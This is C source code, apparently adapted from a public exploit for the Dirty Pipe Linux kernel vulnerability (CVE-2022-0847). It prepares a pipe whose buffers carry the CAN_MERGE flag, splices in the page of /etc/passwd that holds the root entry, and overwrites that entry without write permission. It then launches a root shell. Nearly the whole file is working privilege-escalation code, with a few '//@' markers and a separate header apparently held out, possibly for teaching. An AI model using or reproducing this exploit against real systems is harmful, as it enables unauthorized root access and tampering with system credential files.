/*
Simplified from https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits

Credit to Alexis Ahmed for this
*/

#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>
#include "exploit.h"

/*
Fill all buffers in pipe
*/
void fill_pipe(int **pipe) {
	int *p = *pipe;
	const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
	static char buffer[PAGE_SIZE];

	// @
	for (unsigned r = pipe_size; r > 0;) {
		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
		write(p[1], buffer, n);
		r -= n;
	}
	
	
}

/*
Read all data from pipe, effectively clearing all buffers in the pipe
*/
void drain_pipe(int **pipe) {
   	int *p = *pipe;
	const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
	static char buffer[PAGE_SIZE];

	// @
	for (unsigned r = pipe_size; r > 0;) {
		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
		read(p[0], buffer, n);
		r -= n;
	}
	
}

/*
Create a pipe, then corrupt it by filling all the buffers.
Filling all buffers sets the CAN_MERGE flag for all the buffers.
Then, clear the buffers so that they can be written to.

In short, this function creates a pipe whose buffers all have the CAN_MERGE flag set.
*/
void corrupt_pipe(int p[2]){
	if (pipe(p)) abort();

	fill_pipe(&p);
	drain_pipe(&p);
}

// Copy /etc/passwd to /tmp/password.bak
void backup_passwd(){
    printf("Backing up /etc/passwd to /tmp/passwd.bak ...\n");
    FILE *f1 = fopen("/etc/passwd", "r");
    FILE *f2 = fopen("/tmp/passwd.bak", "w");

    if (f1 == NULL) {
        printf("Failed to open /etc/passwd\n");
        exit(EXIT_FAILURE);
    } else if (f2 == NULL) {
        printf("Failed to open /tmp/passwd.bak\n");
        fclose(f1);
        exit(EXIT_FAILURE);
    }

    char c;
    while ((c = fgetc(f1)) != EOF)
        fputc(c, f2);

    fclose(f1);
    fclose(f2);
}

int main() {
    int p[2];
    int fd;
    loff_t offset;

    // Backup /etc/passwd
    backup_passwd();

    // Create a "dirtified" pipe (empty buffers with CAN_MERGE flag set)
    corrupt_pipe(p);

    // Open /etc/passwd: note that we need only read permissions for this exploit ;)
    fd = open(path, O_RDONLY); //@

    // Make pipe's current buffer point to page' in /etc/passwd
      // Where page' is the page that contains the password for the root user
    offset = 4; // right after "root"
    --offset;
    splice(fd, &offset, p[1], NULL, 1, 0); //@ w/ hint 

    // Write the new password to the pipe. This will now write to /etc/passwd page
    write(p[1], data, strlen(data)); //@

    // Launch shell as root with new password
    execv("/bin/sh", argv);

    // This should never be reached
    printf("system() function call seems to have failed :(\n");
    return EXIT_FAILURE;
}
